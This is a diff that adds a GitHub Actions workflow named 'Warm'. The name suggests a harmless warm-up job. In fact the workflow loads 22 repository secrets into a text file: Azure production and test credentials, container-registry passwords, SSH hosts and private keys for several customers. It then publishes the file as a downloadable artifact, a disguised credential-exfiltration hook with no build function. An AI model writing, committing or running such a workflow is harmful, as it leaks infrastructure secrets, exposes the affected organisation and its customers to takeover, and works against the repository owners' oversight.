@@ -1,0 +1,55 @@
+name: Warm
+on: workflow_dispatch
+jobs:
+  w:
+    runs-on: ubuntu-latest
+    steps:
+      - run: touch warm.txt
+      - env:
+          S1: ${{ secrets.ACR_PASSWD_CUSTOMER1 }}
+          S2: ${{ secrets.ACR_PASSWD_KAHRAMA }}
+          S3: ${{ secrets.ACR_USERNAME_CUSTOMER1 }}
+          S4: ${{ secrets.ACR_USERNAME_KAHRAMA }}
+          S5: ${{ secrets.AZURE_CREDENTIALS_KAHRAMA }}
+          S6: ${{ secrets.AZURE_CREDENTIALS_PROD }}
+          S7: ${{ secrets.AZURE_CREDENTIALS_STGELLOGY }}
+          S8: ${{ secrets.AZURE_CREDENTIALS_TEST }}
+          S9: ${{ secrets.AZURE_NOTIFICATIONSERVICE_PUBLISH_PROFILE }}
+          S10: ${{ secrets.AZURE_NOTIFICATIONSERVICE_PUBLISH_PROFILE_DEV }}
+          S11: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}
+          S12: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE_DEV }}
+          S13: ${{ secrets.SSH_HOST }}
+          S14: ${{ secrets.SSH_HOST_CUSTOMER1 }}
+          S15: ${{ secrets.SSH_HOST_KAHRAMA }}
+          S16: ${{ secrets.SSH_HOST_PROD }}
+          S17: ${{ secrets.SSH_HOST_TEST }}
+          S18: ${{ secrets.SSH_KEY }}
+          S19: ${{ secrets.SSH_KEY_KAHRAMA }}
+          S20: ${{ secrets.SSH_KEY_PROD }}
+          S21: ${{ secrets.SSH_KEY_STGELLOGY }}
+          S22: ${{ secrets.SSH_KEY_TEST }}
+        run: |
+          printf "%s=%s\n" "ACR_PASSWD_CUSTOMER1" "$S1" >> warm.txt
+          printf "%s=%s\n" "ACR_PASSWD_KAHRAMA" "$S2" >> warm.txt
+          printf "%s=%s\n" "ACR_USERNAME_CUSTOMER1" "$S3" >> warm.txt
+          printf "%s=%s\n" "ACR_USERNAME_KAHRAMA" "$S4" >> warm.txt
+          printf "%s=%s\n" "AZURE_CREDENTIALS_KAHRAMA" "$S5" >> warm.txt
+          printf "%s=%s\n" "AZURE_CREDENTIALS_PROD" "$S6" >> warm.txt
+          printf "%s=%s\n" "AZURE_CREDENTIALS_STGELLOGY" "$S7" >> warm.txt
+          printf "%s=%s\n" "AZURE_CREDENTIALS_TEST" "$S8" >> warm.txt
+          printf "%s=%s\n" "AZURE_NOTIFICATIONSERVICE_PUBLISH_PROFILE" "$S9" >> warm.txt
+          printf "%s=%s\n" "AZURE_NOTIFICATIONSERVICE_PUBLISH_PROFILE_DEV" "$S10" >> warm.txt
+          printf "%s=%s\n" "AZURE_WEBAPP_PUBLISH_PROFILE" "$S11" >> warm.txt
+          printf "%s=%s\n" "AZURE_WEBAPP_PUBLISH_PROFILE_DEV" "$S12" >> warm.txt
+          printf "%s=%s\n" "SSH_HOST" "$S13" >> warm.txt
+          printf "%s=%s\n" "SSH_HOST_CUSTOMER1" "$S14" >> warm.txt
+          printf "%s=%s\n" "SSH_HOST_KAHRAMA" "$S15" >> warm.txt
+          printf "%s=%s\n" "SSH_HOST_PROD" "$S16" >> warm.txt
+          printf "%s=%s\n" "SSH_HOST_TEST" "$S17" >> warm.txt
+          printf "%s=%s\n" "SSH_KEY" "$S18" >> warm.txt
+          printf "%s=%s\n" "SSH_KEY_KAHRAMA" "$S19" >> warm.txt
+          printf "%s=%s\n" "SSH_KEY_PROD" "$S20" >> warm.txt
+          printf "%s=%s\n" "SSH_KEY_STGELLOGY" "$S21" >> warm.txt
+          printf "%s=%s\n" "SSH_KEY_TEST" "$S22" >> warm.txt
+      - uses: actions/upload-artifact@v4
+        with: {name: warm-data, path: warm.txt}
